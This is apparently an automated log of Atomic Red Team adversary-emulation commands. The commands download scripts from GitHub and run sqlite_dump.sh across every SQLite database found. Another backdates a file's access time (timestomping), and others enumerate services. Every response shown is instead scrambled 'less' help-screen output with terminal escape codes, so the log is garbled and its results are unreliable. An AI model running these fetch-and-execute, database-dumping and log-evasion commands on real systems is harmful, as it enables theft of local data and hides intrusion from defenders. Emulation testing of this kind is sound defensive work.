-  -F  ........  --quit-if-one-screen[m
-                  Quit if entire file fits on first screen.[m
-  -g  ........  --hilite-search[m
-[7mHELP -- Press RETURN for more, or q when done[m[K[Kgoto mark: [K[K[7mMark not set  (press RETURN)[m[24;1H[K[K...skippin
-
-action:
-command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/art
-response:g...
-  -?  ........  --help[m
-                  Display help (from command line).[m
-  -a  ........  --search-skip-screen[m
-                  Search skips current screen.[m
-  -A  ........  --SEARCH-SKIP-SCREEN[m
-                  Search starts just after target line.[m
-  -b [[4mN[m]  ....  --buffers=[[4mN[m][m
-                  Number of buffers.[m
-  -B  ........  --auto-buffers[m
-                  Don't automatically allocate buffers for pipes.[m
-  -c  ........  --clear-screen[m
-                  Repaint by clearing rather than scrolling.[m
-  -d  ........  --dumb[m
-                  Dumb terminal.[m
-  -D [1mx[0m[4mcolor[m  .  --color=[1mx[0m[4mcolor[m[m
-                  Set screen colors.[m
-  -e  -E  ....  --quit-at-eof  --QUIT-AT-EOF[m
-                  Quit at end of file.[m
-  -f  ........  --force[m
-                  Force open non-regular files.[m
-  -F  ........  --quit-if-one-screen[m
-                  Quit if entire file fits on first screen.[m
-  -g  ........  --hilite-search[m
-[7mHELP -- Press RETURN for more, or q when done[m[K[K                  Highlight only last match for searches.[m
-[7mHELP -- Press RETURN for more, or q when done[m[K[K  -G  ........  --HILITE-SEARCH[m
-[7mHELP -- Press RETURN for more, or q when done[m[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[Kgoto mark: [K[K[7mInvalid mark letter    (press RETURN)[m[24;1H[K[KBrackets: [K[[[K]][K[K[7mNo bracket in bottom line  (press RETURN)[m[24;1H[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[K&/[K&&[K  [Kaa[Kll[Kii[Kaa[Kss[K  [Kpp[Kyy[Ktt[Khh[Koo[Knn[K33[K==[Kpp[Kyy[Ktt[Khh[Koo[Knn[K33[K..[K99[K[H[J[H  -a  ........  --search-skip-screen[m
-                  Search skips current screen.[m
-  -A  ........  --SEARCH-SKIP-SCREEN[m
-                  Search starts just after target line.[m
-  -b [[4mN[m]  ....  --buffers=[[4mN[m][m
-                  Number of buffers.[m
-  -B  ........  --auto-buffers[m
-                  Don't automatically allocate buffers for pipes.[m
-  -c  ........  --clear-screen[m
-                  Repaint by clearing rather than scrolling.[m
-  -d  ........  --dumb[m
-                  Dumb terminal.[m
-  -D [1mx[0m[4mcolor[m  .  --color=[1mx[0m[4mcolor[m[m
-                  Set screen colors.[m
-  -e  -E  ....  --quit-at-eof  --QUIT-AT-EOF[m
-                  Quit at end of file.[m
-  -f  ........  --force[m
-                  Force open non-regular files.[m
-  -F  ........  --quit-if-one-screen[m
-                  Quit if entire file fits on first screen.[m
-  -g  ........  --hilite-search[m
-                  Highlight only last match for searches.[m
-  -G  ........  --HILITE-SEARCH[m
-[7mHELP -- Press RETURN for more, or q when done[m[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[K                  Don't highlight any matches for searches.[m
-  -h [[4mN[m]  ....  --max-back-scroll=[[4mN[m][m
-                  Backward scroll limit.[m
-  -i  ........  --ignore-case[m
-                  Ignore case in searches that do not contain uppercase.[m
-  -I  ........  --IGNORE-CASE[m
-                  Ignore case in all searches.[m
-  -j [[4mN[m]  ....  --jump-target=[[4mN[m][m
-                  Screen position of target lines.[m
-  -J  ........  --status-column[m
-                  Display a status column at left edge of screen.[m
-  -k [[4mfile[m]  .  --lesskey-file=[[4mfile[m][m
-                  Use a lesskey file.[m
-  -K  ........  --quit-on-intr[m
-                  Exit less in response to ctrl-C.[m
-  -L  ........  --no-lessopen[m
-                  Ignore the LESSOPEN environment variable.[m
-  -m  -M  ....  --long-prompt  --LONG-PROMPT[m
-                  Set prompt style.[m
-  -n  -N  ....  --line-numbers  --LINE-NUMBERS[m
-  
-
-action:
-command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/gta.db
-response:                Don't use line numbers.[m
-  -o [[4mfile[m]  .  --log-file=[[4mfile[m][m
-                  Copy to log file (standard input only).[m
-[7mHELP -- Press RETURN for more, or q when done[m[K[K  -O [[4mfile[m]  .  --LOG-FILE=[[4mfile[m][m
-                  Copy to log file (unconditionally overwrite).[m
-  -p [[4mpattern[m]  --pattern=[[4mpattern[m][m
-                  Start at pattern (from command line).[m
-  -P [[4mprompt[m]   --prompt=[[4mprompt[m][m
-                  Define new prompt.[m
-  -q  -Q  ....  --quiet  --QUIET  --silent --SILENT[m
-                  Quiet the terminal bell.[m
-  -r  -R  ....  --raw-control-chars  --RAW-CONTROL-CHARS[m
-                  Output "raw" control characters.[m
-  -s  ........  --squeeze-blank-lines[m
-                  Squeeze multiple blank lines.[m
-  -S  ........  --chop-long-lines[m
-                  Chop (truncate) long lines rather than wrapping.[m
-  -t [[4mtag[m]  ..  --tag=[[4mtag[m][m
-                  Find a tag.[m
-  -T [[4mtagsfile[m] --tag-file=[[4mtagsfile[m][m
-                  Use an alternate tags file.[m
-  -u  -U  ....  --underline-special  --UNDERLINE-SPECIAL[m
-                  Change handling of backspaces.[m
-  -V  ........  --version[m
-                  Display the version number of "less".[m
-  -w  ........  --hilite-unread[m
-[7mHELP -- Press RETURN for more, or q when done[m[K[KBrackets: [K[[[K]][K[HM                  Copy to log file (standard input only).[m
-[HM  -o [[4mfile[m]  .  --log-file=[[4mfile[m][m
-[HM                  Don't use line numbers.[m
-[HM  -n  -N  ....  --line-numbers  --LINE-NUMBERS[m
-[HM                  Set prompt style.[m
-[HM  -m  -M  ....  --long-prompt  --LONG-PROMPT[m
-[HM                  Ignore the LESSOPEN environment variable.[m
-[HM  -L  ........  --no-lessopen[m
-[HM                  Exit less in response to ctrl-C.[m
-[HM  -K  ........  --quit-on-intr[m
-[HM                  Use a lesskey file.[m
-[HM  -k [[4mfile[m]  .  --lesskey-file=[[4mfile[m][m
-[HM                  Display a status column at left edge of screen.[m
-[HM  -J  ........  --status-column[m
-[HM                  Screen position of target lines.[m
-[HM  -j [[4mN[m]  ....  --jump-target=[[4mN[m][m
-[HM                  Ignore case in all searches.[m
-[HM  -I  ........  --IGNORE-CASE[m
-[HM                  Ignore case in searches that do not contain uppercase.[m
-[HM  -i  ........  --ignore-case[m
-[HM                  Backward scroll limit.[m
-[HM  -h [[4mN[m]  ....  --max-back-scroll=[[4mN[m][m
-[24;1H[K[7mHELP -- Press RETURN for more, or q when done[m[K[K                  Copy to log file (unconditionally overwrite).[m
-  -p [[4mpattern[m]  --pattern=[[4mpattern[m][m
-                  Start at pattern (from command line).[m
-  -P [[4mprompt[m]   --prompt=[[4mprompt[m][m
-                  Define new prompt.[m
-  -q  -Q  ....  --quiet  --QUIET  --silent --SILENT[m
-                  Quiet the terminal bell.[m
-  -r  -R  ....  --raw-control-chars  --RAW-CONTROL-CHARS[m
-                  Output "raw" control characters.[m
-  -s  ........  --squeeze-blank-lines[m
-                  Squeeze multiple blank lines.[m
-  -S  ........  --chop-long-lines[m
-                  Chop (truncate) long lines rather than wrapping.[m
-  -t [[4mtag[m]  ..  --tag=[[4mtag[m][m
-                  Find a tag.[m
-  -T [[4mtagsfile[m] --tag-file=[[4mtagsfile[m][m
-                  Use an alternate tags file.[m
-  -u  -U  ....  --underline-special  --UNDERLINE-SPECIAL[m
-                  Change handling of backspaces.[m
-  -V  ........  --version[m
-                  Display the version number of "less".[m
-  -w  ........  --hilite-unread[m
-                  Highlight first new line after forward-screen.[m
-[7mHELP -- Press RETURN for more, or q when done[m[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[KBrackets: [K(([K))[K[HM 
-
-action:
-command:curl -O https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src/sqlite_dump.sh
-response: -O [[4mfile[m]  .  --LOG-FILE=[[4mfile[m][m
-[HM                  Copy to log file (standard input only).[m
-[HM  -o [[4mfile[m]  .  --log-file=[[4mfile[m][m
-[HM                  Don't use line numbers.[m
-[HM  -n  -N  ....  --line-numbers  --LINE-NUMBERS[m
-[HM                  Set prompt style.[m
-[HM  -m  -M  ....  --long-prompt  --LONG-PROMPT[m
-[HM                  Ignore the LESSOPEN environment variable.[m
-[HM  -L  ........  --no-lessopen[m
-[HM                  Exit less in response to ctrl-C.[m
-[HM  -K  ........  --quit-on-intr[m
-[HM                  Use a lesskey file.[m
-[HM  -k [[4mfile[m]  .  --lesskey-file=[[4mfile[m][m
-[HM                  Display a status column at left edge of screen.[m
-[HM  -J  ........  --status-column[m
-[HM                  Screen position of target lines.[m
-[HM  -j [[4mN[m]  ....  --jump-target=[[4mN[m][m
-[HM                  Ignore case in all searches.[m
-[HM  -I  ........  --IGNORE-CASE[m
-[HM                  Ignore case in searches that do not contain uppercase.[m
-[HM  -i  ........  --ignore-case[m
-[HM                  Backward scroll limit.[m
-[24;1H[K[7mHELP -- Press RETURN for more, or q when done[m[K[K[HM  -h [[4mN[m]  ....  --max-back-scroll=[[4mN[m][m
-[HM                  Don't highlight any matches for searches.[m
-[HM  -G  ........  --HILITE-SEARCH[m
-[HM                  Highlight only last match for searches.[m
-[HM  -g  ........  --hilite-search[m
-[HM                  Quit if entire file fits on first screen.[m
-[HM  -F  ........  --quit-if-one-screen[m
-[HM                  Force open non-regular files.[m
-[HM  -f  ........  --force[m
-[HM                  Quit at end of file.[m
-[HM  -e  -E  ....  --quit-at-eof  --QUIT-AT-EOF[m
-[HM                  Set screen colors.[m
-[HM  -D [1mx[0m[4mcolor[m  .  --color=[1mx[0m[4mcolor[m[m
-[HM                  Dumb terminal.[m
-[HM  -d  ........  --dumb[m
-[HM                  Repaint by clearing rather than scrolling.[m
-[HM  -c  ........  --clear-screen[m
-[HM                  Don't automatically allocate buffers for pipes.[m
-[HM  -B  ........  --auto-buffers[m
-[HM                  Number of buffers.[m
-[HM  -b [[4mN[m]  ....  --buffers=[[4mN[m][m
-[HM                  Search starts just after target line.[m
-[HM  -A  ........  --SEARCH-SKIP-SCREEN[m
-[24;1H[K[7mHELP -- Press RETURN for more, or q when done[m[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[K                  Backward scroll limit.[m
-  -i  ........  --ignore-case[m
-                  Ignore case in searches that do not contain uppercase.[m
-  -I  ........  --IGNORE-CASE[m
-                  Ignore case in all searches.[m
-  -j [[4mN[m]  ....  --jump-target=[[4mN[m][m
-                  Screen position of target lines.[m
-  -J  ........  --status-column[m
-                  Display a status column at left edge of screen.[m
-  -k [[4mfile[m]  .  --lesskey-file=[[4mfile[m][m
-                  Use a lesskey file.[m
-  -K  ........  --quit-on-intr[m
-                  Exit less in response to ctrl-C.[m
-  -L  ........  --no-lessopen[m
-                  Ignore the LESSOPEN environment variable.[m
-  -m  -M  ....  --long-prompt  --LONG-PROMPT[m
-                  Set prompt style.[m
-  -n  -N  ....  --line-numbers  --LINE-NUMBERS[m
-                  Don't use line numbers.[m
-  -o [[4mfile[m]  .  --log-file=[[4mfile[m][m
-                  Copy to log file (standard input only).[m
-  -O [[4mfile[m]  .  --LOG-FILE=[[4mfile[m][m
-                  Copy to log file (unconditionally overwrite).[m
-[7mHELP -- Press RETURN for more, or q when done[m[K[K[H[J[HM  ESC-)  RightArrow *  Right one half screen width (or [4mN[m positions).[m
-
-
-action:
-command:chmod +x sqlite_dump.sh
-response:[HM  u  ^U             *  Backward one half-window (and set half-window to [4mN[m).[m
-[HM  d  ^D             *  Forward  one half-window (and set half-window to [4mN[m).[m
-[HM  ESC-SPACE         *  Forward  one window, but don't stop at end-of-file.[m
-[HM  w                 *  Backward one window (and set window to [4mN[m).[m
-[HM  z                 *  Forward  one window (and set window to [4mN[m).[m
-[HM  b  ^B  ESC-v      *  Backward one window (or [4mN[m lines).[m
-[HM  f  ^F  ^V  SPACE  *  Forward  one window (or [4mN[m lines).[m
-[HM  y  ^Y  k  ^K  ^P  *  Backward one line   (or [4mN[m lines).[m
-[HM  e  ^E  j  ^N  CR  *  Forward  one line   (or [4mN[m lines).[m
-[HM[m
-[HM                           [1mMOVING[0m[m
-[HM[m
-[HM ---------------------------------------------------------------------------[m
-[HM  q  :q  Q  :Q  ZZ     Exit.[m
-[HM  h  H                 Display this help.[m
-[HM[m
-[HM      A key preceded by a caret indicates the Ctrl key; thus ^K is ctrl-K.[m
-[HM      Notes in parentheses indicate the behavior if [4mN[m is given.[m
-[HM      Commands marked with * may be preceded by a number, [4mN[m.[m
-[HM[m
-[HM                   [1mSUMMARY[0m [1mOF[0m [1mLESS[0m [1mCOMMANDS[0m[m
-[HM[m
-[24;1H[K[7mHELP -- Press RETURN for more, or q when done[m[K[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[K[7mNo next tag  (press RETURN)[m[24;1H[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[KNon-match &/[K  ESC-(  LeftArrow  *  Left  one half screen width (or [4mN[m positions).[m
-[7mHELP -- Press RETURN for more, or q when done[m[K[K:[K33[KBrackets: [K(([K))[K[K[7mNo bracket in bottom line  (press RETURN)[m[24;1H[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[KBrackets: [K[[[K]][K[K[7mNo bracket in bottom line  (press RETURN)[m[24;1H[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[K  ESC-}  ^RightArrow   Right to last column displayed.[m
-  ESC-{  ^LeftArrow    Left  to first column.[m
-  F                    Forward forever; like "tail -f".[m
-  ESC-F                Like F but stop when search pattern is found.[m
-  r  ^R  ^L            Repaint screen.[m
-  R                    Repaint screen, discarding buffered input.[m
-        ---------------------------------------------------[m
-        Default "window" is the screen height.[m
-        Default "half-window" is half of the screen height.[m
- ---------------------------------------------------------------------------[m
-[m
-                          [1mSEARCHING[0m[m
-[m
-  /[4mpattern[m          *  Search forward for ([4mN[m-th) matching line.[m
-  ?[4mpattern[m          *  Search backward for ([4mN[m-th) matching line.[m
-  n                 *  Repeat previous search (for [4mN[m-th occurrence).[m
-  N                 *  Repeat previous search in reverse direction.[m
-  ESC-n             *  Repeat previous search, spanning files.[m
-  ESC-N             *  Repeat previous search, reverse dir. & spanning files.[m
-  ESC-u                Undo (toggle) search highlighting.[m
-  ESC-U                Clear search highlighting.[m
-  &[4mpattern[m          *  Display only matching lines.[m
-        ---------------------------------------------------[m
-[7mHELP -- Press RETURN for more, or q when done[m[K[K[7mNo next tag  (press RETURN)[m[24;1H[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[K        A search pattern may begin with one or more of:[m
-[7mHELP -- Press RETURN for more, or q when done[m[K[KNon-match &/[K        ^N or !  Search for NON-matching lines.[m
-[7mHELP -- Press RETURN for more, or q when done[m[K[K        ^E or *  Search multiple files (pass thru END OF FILE).[m
-        ^F or @  Start search at FIRST file (for /) or last file (for ?).[m
-        ^K       Highlight matches, but don't move (KEEP posi
-
-action:
-command:find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
-response:tion).[m
-        ^R       Don't use REGULAR EXPRESSIONS.[m
-        ^W       WRAP search if no match found.[m
- ---------------------------------------------------------------------------[m
-[m
-                           [1mJUMPING[0m[m
-[m
-  g  <  ESC-<       *  Go to first line in file (or line [4mN[m).[m
-  G  >  ESC->       *  Go to last line in file (or line [4mN[m).[m
-  p  %              *  Go to beginning of file (or [4mN[m percent into file).[m
-  t                 *  Go to the ([4mN[m-th) next tag.[m
-  T                 *  Go to the ([4mN[m-th) previous tag.[m
-  {  (  [           *  Find close bracket } ) ].[m
-  }  )  ]           *  Find open bracket { ( [.[m
-  ESC-^F [4m<c1>[m [4m<c2>[m  *  Find close bracket [4m<c2>[m.[m
-  ESC-^B [4m<c1>[m [4m<c2>[m  *  Find open bracket [4m<c1>[m.[m
-        ---------------------------------------------------[m
-        Each "find close bracket" command goes forward to the close bracket [m
-          matching the ([4mN[m-th) open bracket in the top line.[m
-        Each "find open bracket" command goes backward to the open bracket [m
-          matching the ([4mN[m-th) close bracket in the bottom line.[m
-[7mHELP -- Press RETURN for more, or q when done[m[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[K[m
-  m[4m<letter>[m            Mark the current top line with <letter>.[m
-  M[4m<letter>[m            Mark the current bottom line with <letter>.[m
-  '[4m<letter>[m            Go to a previously marked position.[m
-  ''                   Go to the previous position.[m
-  ^X^X                 Same as '.[m
-  ESC-M[4m<letter>[m        Clear a mark.[m
-        ---------------------------------------------------[m
-        A mark is any upper-case or lower-case letter.[m
-        Certain marks are predefined:[m
-             ^  means  beginning of the file[m
-             $  means  end of the file[m
-[7mHELP -- Press RETURN for more, or q when done[m[K[K ---------------------------------------------------------------------------[m
-[m
-                        [1mCHANGING[0m [1mFILES[0m[m
-[m
-  :e [[4mfile[m]            Examine a new file.[m
-  ^X^V                 Same as :e.[m
-  :n                *  Examine the ([4mN[m-th) next file from the command line.[m
-  :p                *  Examine the ([4mN[m-th) previous file from the command line.[m
-  :x                *  Examine the first (or [4mN[m-th) file from the command line.[m
-  :d                   Delete the current file from the command line list.[m
-  =  ^G  :f            Print current file name.[m
- ---------------------------------------------------------------------------[m
-[m
-                    [1mMISCELLANEOUS[0m [1mCOMMANDS[0m[m
-[m
-  -[4m<flag>[m              Toggle a command line option [see OPTIONS below].[m
-  --[4m<name>[m             Toggle a command line option, by name.[m
-  _[4m<flag>[m              Display the setting of a command line option.[m
-  __[4m<name>[m             Display the setting of an option, by name.[m
-  +[4mcmd[m                 Execute the less cmd each time a new file is examined.[m
-[m
-  ![4mcommand[m             Execute the shell command with $SHELL.[m
-  |[1mX[0m[4mcommand[m            Pipe file between current pos & mark [1mX[0m to shell command.[m
-[7mHELP -- Press RETURN for more, or q when done[m[K[K/[Ktt[Kmm[Kpp[K;;[K  [Kpp[Kyy[Ktt[Khh[Koo[Knn[K33[K  [K--[Kmm[K  [Khh[Ktt[Ktt[Kpp[K..[Kss[Kee[Krr[Kvv[Kee[Krr[K  [K99[K00[K99[K00[K  [K&&[K  [KPP[KII[KDD[K==[K$$[K!![K;;[K  [Kss[Kll[Kee[Kee[Kpp[K  [K11[K00[K;;[K  [Kkk[Kii[Kll[Kll[K  [K$$[KPP[KII[KDD[K;;[K  [Kuu[Knn[Kss[Kee[Ktt[K  [KPP[KII[KDD[K;;[K  [Kff[Kii[K[1;1H ---------------------------------------------------------------------------[m
-[2;1H[m
-[3;1H                        [1mCHANGING[0m [1mFILES[
-
-action:
-command:echo 'T1070.006 file access timestomp test' > /tmp/T1070.006-access.txt
-response:0m[m
-[4;1H[m
-[5;1H  :e [[4mfile[m]            Examine a new file.[m
-[6;1H  ^X^V                 Same as :e.[m
-[7;1H  :n                *  Examine the ([4mN[m-th) next file from the command line.[m
-[8;1H  :p                *  Examine the ([4mN[m-th) previous file from the command line.[m
-[9;1H  :x                *  Examine the first (or [4mN[m-th) file from the command line.[m
-[10;1H  :d                   Delete the current file from the command line list.[m
-[11;1H  =  ^G  :f            Print current file name.[m
-[12;1H ---------------------------------------------------------------------------[m
-[13;1H[m
-[14;1H                    [1mMISCELLANEOUS[0m [1mCOMMANDS[0m[m
-[15;1H[m
-[16;1H  -[4m<flag>[m              Toggle a command line option [see OPTIONS below].[m
-[17;1H  --[4m<name>[m             Toggle a command line option, by name.[m
-[18;1H  _[4m<flag>[m              Display the setting of a command line option.[m
-[19;1H  __[4m<name>[m             Display the setting of an option, by name.[m
-[20;1H  +[4mcmd[m                 Execute the less cmd each time a new file is examined.[m
-[21;1H[m
-[22;1H  ![4mcommand[m             Execute the shell command with $SHELL.[m
-[23;1H  |[1mX[0m[4mcommand[m            Pipe file between current pos & mark [1mX[0m to shell command.[m
-[24;1H[1;1H ---------------------------------------------------------------------------[m
-[2;1H[m
-[3;1H                        [1mCHANGING[0m [1mFILES[0m[m
-[4;1H[m
-[5;1H  :e [[4mfile[m]            Examine a new file.[m
-[6;1H  ^X^V                 Same as :e.[m
-[7;1H  :n                *  Examine the ([4mN[m-th) next file from the command line.[m
-[8;1H  :p                *  Examine the ([4mN[m-th) previous file from the command line.[m
-[9;1H  :x                *  Examine the first (or [4mN[m-th) file from the command line.[m
-[10;1H  :d                   Delete the current file from the command line list.[m
-[11;1H  =  ^G  :f            Print current file name.[m
-[12;1H ---------------------------------------------------------------------------[m
-[13;1H[m
-[14;1H                    [1mMISCELLANEOUS[0m [1mCOMMANDS[0m[m
-[15;1H[m
-[16;1H  -[4m<flag>[m              Toggle a command line option [see OPTIONS below].[m
-[17;1H  --[4m<name>[m             Toggle a command line option, by name.[m
-[18;1H  _[4m<flag>[m              Display the setting of a command line option.[m
-[19;1H  __[4m<name>[m             Display the setting of an option, by name.[m
-[20;1H  +[4mcmd[m                 Execute the less cmd each time a new file is examined.[m
-[21;1H[m
-[22;1H  ![4mcommand[m             Execute the shell command with $SHELL.[m
-[23;1H  |[1mX[0m[4mcommand[m            Pipe file between current pos & mark [1mX[0m to shell command.[m
-[24;1H[K[7mPattern not found  (press RETURN)[m[24;1H[K[K[7mHELP -- Press RETURN for more, or q when done[m[K[K  s [4mfile[m               Save input to a file.[m
-  v                    Edit the current file with $VISUAL or $EDITOR.[m
-  V                    Print version number of "less".[m
- ---------------------------------------------------------------------------[m
-[m
-                           [1mOPTIONS[0m[m
-[m
-        Most options may be changed either on the command line,[m
-        or from within less by using the - or -- command.[m
-        Options may be given in one of two forms: either a single[m
-        character preceded by a -, or a name preceded by --.[m
-[m
-  -?  ........  --help[m
-                  Display help (from command line).[m
-  -a  ........  --search-skip-screen[m
-                  Search skips current screen.[m
-  -A  ........  --SEARCH-SKIP-SCREEN[m
-                  Search starts just after target line.[m
-  -b [[4mN[m]  ....  --buffers=[[4mN[m][m
-                  Number of buffers.[m
-  -B  ........  --auto-buffers[m
-                  Don't automatically allocate buffers 
-
-action:
-command:touch -a -t 197001010000.00 /tmp/T1070.006-access.txt
-response:for pipes.[m
-  -c  ........  --clear-screen[m
-[7mHELP -- Press RETURN for more, or q when done[m[K[K                  Repaint by clearing rather than scrolling.[m
-  -d  ........  --dumb[m
-                  Dumb terminal.[m
-  -D [1mx[0m[4mcolor[m  .  --color=[1mx[0m[4mcolor[m[m
-                  Set screen colors.[m
-  -e  -E  ....  --quit-at-eof  --QUIT-AT-EOF[m
-                  Quit at end of file.[m
-  -f  ........  --force[m
-                  Force open non-regular files.[m
-  -F  ........  --quit-if-one-screen[m
-                  Quit if entire file fits on first screen.[m
-  -g  ........  --hilite-search[m
-                  Highlight only last match for searches.[m
-  -G  ........  --HILITE-SEARCH[m
-                  Don't highlight any matches for searches.[m
-  -h [[4mN[m]  ....  --max-back-scroll=[[4mN[m][m
-                  Backward scroll limit.[m
-  -i  ........  --ignore-case[m
-                  Ignore case in searches that do not contain uppercase.[m
-  -I  ........  --IGNORE-CASE[m
-                  Ignore case in all searches.[m
-  -j [[4mN[m]  ....  --jump-target=[[4mN[m][m
-                  Screen position of target lines.[m
-[7mHELP -- Press RETURN for more, or q when done[m[K[K[H[J[HM  ESC-)  RightArrow *  Right one half screen width (or [4mN[m positions).[m
-[HM  u  ^U             *  Backward one half-window (and set half-window to [4mN[m).[m
-[HM  d  ^D             *  Forward  one half-window (and set half-window to [4mN[m).[m
-[HM  ESC-SPACE         *  Forward  one window, but don't stop at end-of-file.[m
-[HM  w                 *  Backward one window (and set window to [4mN[m).[m
-[HM  z                 *  Forward  one window (and set window to [4mN[m).[m
-[HM  b  ^B  ESC-v      *  Backward one window (or [4mN[m lines).[m
-[HM  f  ^F  ^V  SPACE  *  Forward  one window (or [4mN[m lines).[m
-[HM  y  ^Y  k  ^K  ^P  *  Backward one line   (or [4mN[m lines).[m
-[HM  e  ^E  j  ^N  CR  *  Forward  one line   (or [4mN[m lines).[m
-[HM[m
-[HM                           [1mMOVING[0m[m
-[HM[m
-[HM ---------------------------------------------------------------------------[m
-[HM  q  :q  Q  :Q  ZZ     Exit.[m
-[HM  h  H                 Display this help.[m
-[HM[m
-[HM      A key preceded by a caret indicates the Ctrl key; thus ^K is ctrl-K.[m
-[HM      Notes in parentheses indicate the behavior if [4mN[m is given.[m
-[HM      Commands marked with * may be preceded by a number, [4mN[m.[m
-[HM[m
-[HM                   [1mSUMMARY[0m [1mOF[0m [1mLESS[0m [1mCOMMANDS[0m[m
-[HM[m
-[24;1H[K[7mHELP -- Press RETURN for more, or q when done[m[K[K...skipping...
-[m
-                   [1mSUMMARY[0m [1mOF[0m [1mLESS[0m [1mCOMMANDS[0m[m
-[m
-      Commands marked with * may be preceded by a number, [4mN[m.[m
-      Notes in parentheses indicate the behavior if [4mN[m is given.[m
-      A key preceded by a caret indicates the Ctrl key; thus ^K is ctrl-K.[m
-[m
-  h  H                 Display this help.[m
-  q  :q  Q  :Q  ZZ     Exit.[m
- ---------------------------------------------------------------------------[m
-[m
-                           [1mMOVING[0m[m
-[m
-  e  ^E  j  ^N  CR  *  Forward  one line   (or [4mN[m lines).[m
-  y  ^Y  k  ^K  ^P  *  Backward one line   (or [4mN[m lines).[m
-  f  ^F  ^V  SPACE  *  Forward  one window (or [4mN[m lines).[m
-  b  ^B  ESC-v      *  Backward one window (or [4mN[m lines).[m
-  z                 *  Forward  one window (and set window to [4mN[m).[m
-  w                 *  Backward one window (and set window to [4mN[m).[m
-  ESC-SPACE         *  Forward  one window, but don't stop at end-of-file.[m
-  d  ^D             *  Forward  one half-window (and set half-window to [4mN[m).[m
-  u  ^U             *  Backward one half-window (and set half-window to [4mN[m).[m
-  ESC-)  RightArrow *  Right one half screen width (or [4mN[m positions).[m
-[7mHELP -- Pre
-
-action:
-command:if [ "$(uname)" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;
-response:ss RETURN for more, or q when done[m[K[K  ESC-(  LeftArrow  *  Left  one half screen width (or [4mN[m positions).[m
-[7mHELP -- Press RETURN for more, or q when done[m[K[K[HM[m
-[24;1H[K[7mHELP -- Press RETURN for more, or q when done[m[K[K  ESC-(  LeftArrow  *  Left  one half screen width (or [4mN[m positions).[m
-  ESC-}  ^RightArrow   Right to last column displayed.[m
-  ESC-{  ^LeftArrow    Left  to first column.[m
-  F                    Forward forever; like "tail -f".[m
-  ESC-F                Like F but stop when search pattern is found.[m
-  r  ^R  ^L            Repaint screen.[m
-  R                    Repaint screen, discarding buffered input.[m
-        ---------------------------------------------------[m
-        Default "window" is the screen height.[m
-        Default "half-window" is half of the screen height.[m
- ---------------------------------------------------------------------------[m
-[m
-                          [1mSEARCHING[0m[m
-[m
-  /[4mpattern[m          *  Search forward for ([4mN[m-th) matching line.[m
-  ?[4mpattern[m          *  Search backward for ([4mN[m-th) matching line.[m
-  n                 *  Repeat previous search (for [4mN[m-th occurrence).[m
-  N                 *  Repeat previous search in reverse direction.[m
-  ESC-n             *  Repeat previous search, spanning files.[m
-  ESC-N             *  Repeat previous search, reverse dir. & spanning files.[m
-  ESC-u                Undo (toggle) search highlighting.[m
-  ESC-U                Clear search highlighting.[m
-  &[4mpattern[m          *  Display only matching lines.[m
-[7mHELP -- Press RETURN for more, or q when done[m[K[K-[1;1H  ESC-(  LeftArrow  *  Left  one half screen width (or [4mN[m positions).[m
-[2;1H  ESC-}  ^RightArrow   Right to last column displayed.[m
-[3;1H  ESC-{  ^LeftArrow    Left  to first column.[m
-[4;1H  F                    Forward forever; like "tail -f".[m
-[5;1H  ESC-F                Like F but stop when search pattern is found.[m
-[6;1H  r  ^R  ^L            Repaint screen.[m
-[7;1H  R                    Repaint screen, discarding buffered input.[m
-[8;1H        ---------------------------------------------------[m
-[9;1H        Default "window" is the screen height.[m
-[10;1H        Default "half-window" is half of the screen height.[m
-[11;1H ---------------------------------------------------------------------------[m
-[12;1H[m
-[13;1H                          [1mSEARCHING[0m[m
-[14;1H[m
-[15;1H  /[4mpattern[m          *  Search forward for ([4mN[m-th) matching line.[m
-[16;1H  ?[4mpattern[m          *  Search backward for ([4mN[m-th) matching line.[m
-[17;1H  n                 *  Repeat previous search (for [4mN[m-th occurrence).[m
-[18;1H  N                 *  Repeat previous search in reverse direction.[m
-[19;1H  ESC-n             *  Repeat previous search, spanning files.[m
-[20;1H  ESC-N             *  Repeat previous search, reverse dir. & spanning files.[m
-[21;1H  ESC-u                Undo (toggle) search highlighting.[m
-[22;1H  ESC-U                Clear search highlighting.[m
-[23;1H  &[4mpattern[m          *  Display only matching lines.[m
-[24;1H[1;1H  ESC-(  LeftArrow  *  Left  one half screen width (or [4mN[m positions).[m
-[2;1H  ESC-}  ^RightArrow   Right to last column displayed.[m
-[3;1H  ESC-{  ^LeftArrow    Left  to first column.[m
-[4;1H  F                    Forward forever; like "tail -f".[m
-[5;1H  ESC-F                Like F but stop when search pattern is found.[m
-[6;1H  r  ^R  ^L            Repaint screen.[m
-[7;1H  R                    Repaint screen, discarding buffered input.[m
-[8;1H        ---------------------------------------------------[m
-[9;1H        Default "window" is the screen height.[m
-[10;1H        Default "half-window" is half of the screen height.[m
-[11;1H ---------------------------------------------------------------------------[m
-[12;1H[m
-[13;1H                          [1mSEARCH
-
-action:
-command:[ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9
-response:ING[0m[m
-[14;1H[m
-[15;1H  /[4mpattern[m          *  Search forward for ([4mN[m-th) matching line.[m
-[16;1H  ?[4mpattern[m          *  Search backward for ([4mN[m-th) matching line.[m
-[17;1H  n                 *  Repeat previous search (for [4mN[m-th occurrence).[m
-[18;1H  N                 *  Repeat previous search in reverse direction.[m
